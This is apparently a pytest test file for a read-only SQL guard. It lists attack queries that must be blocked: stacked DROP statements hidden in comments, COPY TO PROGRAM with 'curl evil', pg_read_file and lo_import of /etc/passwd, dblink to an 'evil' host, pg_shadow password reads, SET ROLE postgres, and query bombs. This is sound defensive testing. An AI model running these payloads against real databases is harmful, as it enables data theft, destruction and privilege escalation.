"""Attacks on the SQL guard. Each one names the rule that must fire. No database, no API key: the
same attacks sent straight to the app_ro role are in tests/integration (Step 3, executor work)."""

import pytest

from assistant.guard import RULES, GuardedSQL, check
from assistant.schemas import GuardViolation

NESTED = "SELECT " + "(SELECT " * 8 + "1" + ")" * 8

# (id, sql, rule that must fire)
ATTACKS = [
    # writes and DDL, also hidden in a CTE
    ("drop", "DROP TABLE suppliers", "write_or_ddl"),
    ("delete", "DELETE FROM shopping_carts", "write_or_ddl"),
    ("truncate", "TRUNCATE meta", "write_or_ddl"),
    ("create table as", "CREATE TABLE copy AS SELECT * FROM suppliers", "write_or_ddl"),
    ("grant", "GRANT SELECT ON suppliers TO PUBLIC", "write_or_ddl"),
    (
        "cte wrapping insert",
        "WITH x AS (INSERT INTO meta VALUES ('k', 'v') RETURNING *) SELECT * FROM x",
        "write_or_ddl",
    ),
    (
        "cte wrapping update",
        "WITH u AS (UPDATE suppliers SET status = 'active' RETURNING *) SELECT * FROM u",
        "write_or_ddl",
    ),
    # stacked statements, including behind comments and string tricks
    ("stacked", "SELECT 1; DROP TABLE suppliers", "statement_count"),
    ("stacked after line comment", "SELECT 1 --\n; DROP TABLE suppliers", "statement_count"),
    (
        "stacked after block comment",
        "SELECT * FROM suppliers /* harmless */; DELETE FROM meta",
        "statement_count",
    ),
    ("stacked after backslash", "SELECT 'a\\'; DROP TABLE suppliers; --'", "statement_count"),
    # other statements
    ("copy to program", "COPY (SELECT * FROM suppliers) TO PROGRAM 'curl evil'", "not_select"),
    ("copy to file", "COPY suppliers TO '/tmp/suppliers.csv'", "not_select"),
    ("set role", "SET ROLE postgres", "not_select"),
    ("set timeout", "SET statement_timeout = 0", "not_select"),
    ("reset", "RESET ALL", "not_select"),
    ("do block", "DO $$ BEGIN PERFORM pg_sleep(10); END $$", "not_select"),
    ("call", "CALL refresh_everything()", "not_select"),
    ("explain analyze", "EXPLAIN ANALYZE DELETE FROM meta", "not_select"),
    ("begin", "BEGIN", "not_select"),
    ("select into", "SELECT * INTO stolen FROM suppliers", "select_into"),
    ("for update", "SELECT * FROM suppliers FOR UPDATE", "locking_clause"),
    (
        "for share in a subquery",
        "SELECT * FROM (SELECT * FROM suppliers FOR SHARE) AS s",
        "locking_clause",
    ),
    # system catalogs and other schemas
    ("pg_catalog", "SELECT * FROM pg_catalog.pg_authid", "table_not_allowed"),
    ("unqualified catalog", "SELECT usename, passwd FROM pg_shadow", "table_not_allowed"),
    ("information_schema", "SELECT * FROM information_schema.tables", "table_not_allowed"),
    ("comments as spaces", "SELECT/**/*/**/FROM/**/pg_roles", "table_not_allowed"),
    (
        "cte shadowing a catalog",
        "WITH a AS (SELECT * FROM pg_authid), pg_authid AS (SELECT 1) SELECT * FROM a",
        "table_not_allowed",
    ),
    ("unicode escape", 'SELECT * FROM U&"pg\\0061uthid"', "parse_error"),
    # dangerous functions
    ("pg_sleep", "SELECT pg_sleep(10)", "function_not_allowed"),
    ("qualified pg_sleep", "SELECT pg_catalog.pg_sleep(10)", "function_not_allowed"),
    ("quoted pg_sleep", 'SELECT "pg_sleep"(10)', "function_not_allowed"),
    ("set_config", "SELECT set_config('role', 'postgres', false)", "function_not_allowed"),
    ("read file", "SELECT pg_read_file('/etc/passwd')", "function_not_allowed"),
    ("dblink", "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a int)", "function_not_allowed"),
    ("large object", "SELECT lo_import('/etc/passwd')", "function_not_allowed"),
    (
        "row bomb",
        "SELECT COUNT(*) FROM generate_series(1, 1000000000000)",
        "function_not_allowed",
    ),
    # size and shape
    ("deep nesting", NESTED, "max_depth"),
    ("long expression chain", "SELECT 1" + " + 1" * 200, "max_depth"),
    ("parenthesis bomb", "SELECT " + "(" * 3000 + "1" + ")" * 3000, "parse_error"),
    ("too long", "SELECT 1 FROM suppliers WHERE " + " OR ".join(["true"] * 3000), "too_long"),
    ("limit from a subquery", "SELECT * FROM suppliers LIMIT (SELECT 1000000)", "limit_invalid"),
    ("quoted helper", 'SELECT "make_date"(2025, 1, 1)', "roundtrip_mismatch"),
]


@pytest.mark.parametrize(("sql", "rule"), [a[1:] for a in ATTACKS], ids=[a[0] for a in ATTACKS])
def test_attack_is_blocked_by_the_intended_rule(sql: str, rule: str) -> None:
    result = check(sql)
    assert isinstance(result, GuardViolation), f"not blocked: {result}"
    assert result.rule == rule, result.message


def test_every_rule_has_an_attack() -> None:
    assert {rule for _, _, rule in ATTACKS} == set(RULES)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT name FROM suppliers -- LIMIT 5",
        "SELECT name FROM suppliers /* /* nested */ ; DROP TABLE suppliers; */",
        "SELECT name /* ; DELETE FROM meta */ FROM suppliers",
    ],
)
def test_comments_never_reach_the_database(sql: str) -> None:
    """The returned SQL is regenerated from the tree: what was hidden in a comment is gone, and a
    trailing `--` cannot swallow the forced LIMIT."""
    result = check(sql)
    assert result == GuardedSQL(sql="SELECT name FROM suppliers LIMIT 1000", limit="added")


def test_exploding_cross_join_is_left_to_the_executor() -> None:
    """Not decidable by the guard: a cross join of one-row CTEs (as_of_date) is a normal pattern,
    and `JOIN ... ON true` builds the same product, so the guard cannot tell a harmless one from
    17,160^3 rows. It also cannot bound COUNT(*), which returns one row whatever the LIMIT. The
    executor's EXPLAIN cost check stops it: see test_exploding_cross_join_is_stopped_by_the_explain
    _check in tests/integration/test_executor_db.py."""
    sql = (
        "SELECT COUNT(*) FROM shopping_cart_items AS a CROSS JOIN shopping_cart_items AS b"
        " CROSS JOIN shopping_cart_items AS c"
    )
    assert isinstance(check(sql), GuardedSQL)
